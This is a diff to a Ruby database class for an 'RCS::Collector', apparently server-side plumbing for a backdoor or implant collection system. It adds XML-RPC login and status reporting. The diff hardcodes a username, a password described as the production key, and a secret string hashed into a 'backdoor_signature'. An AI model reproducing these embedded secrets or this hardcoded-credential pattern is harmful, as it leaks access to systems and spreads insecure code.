@@ -4,6 +4,7 @@
 
 # relatives
 require_relative 'config.rb'
+require_relative 'db_xmlrpc.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -27,14 +28,48 @@ class DB
   attr_reader :backdoor_signature
 
   def initialize
-    @db_host = Config.instance.global['DB_ADDRESS'].to_s + ":" + Config.instance.global['DB_PORT'].to_s
-    @db_avail = false
-    
-    return @db_avail
+    # database address
+    @host = Config.instance.global['DB_ADDRESS'].to_s + ":" + Config.instance.global['DB_PORT'].to_s
+
+    # database credentials
+    @username = "9b7b0492433bd580805ba7685ae41b73RSS" #TODO: use an unique id
+    @password = "hJ44ApRjUrMgd5137WzVCXrkkCBYEG4o"    #TODO: this is the rcs-prod key
+
+    # status of the db connection
+    @available = false
+    @cookie = nil
+
+    # the current db layer to be used is the XML-RPC protocol
+    # this will be replaced by DB_rabbitmq
+    @db = DB_xmlrpc.new @host
+
+    return @available
+  end
+
+  def connect!
+    trace :info, "Checking the DB connection [#{@host}]..."
+    if @db.login @username, @password then
+      @available = true
+      trace :info, "Connected to [#{@host}]"
+    else
+      @available = false
+      trace :error, "Cannot login to DB"
+    end
+  end
+
+  def disconnect!
+    @db.logout
+    @available = false
+    trace :info, "Disconnected from [#{@host}]"
+  end
+
+  def connected?
+    # is the database available ?
+    return @available
   end
 
   def cache_init
-    if @db_avail then
+    if @available then
       trace :info, "Initializing the DB cache..."
       #TODO: empty the cache and populate it again
     else
@@ -43,21 +78,17 @@ class DB
     @backdoor_signature = Digest::MD5.digest '4yeN5zu0+il3Jtcb5a1sBcAdjYFcsD9z'
   end
 
-  def check_conn
-    trace :info, "Checking the DB connection [#{@db_host}]..."
-    #TODO: check the connection
-    #trace :error, "Database is down"
-    @db_avail = true
-  end
-
-  def connected?
-    #TODO: is the database available ?
-    return @db_avail
-  end
-
-  def update_status(message)
-    #TODO: implement the real heartbeat
+  def update_status(status, message)
     trace :debug, "update status: #{message}"
+    component = "RCS::Collector"
+    remoteip = '' # used only by NC
+
+    #TODO: implement these metrics
+    disk = 0
+    cpu = 0
+    pcpu = 0
+
+    @db.update_status component, remoteip, status, message, disk, cpu, pcpu 
   end
 
   def class_key_of(build_id)
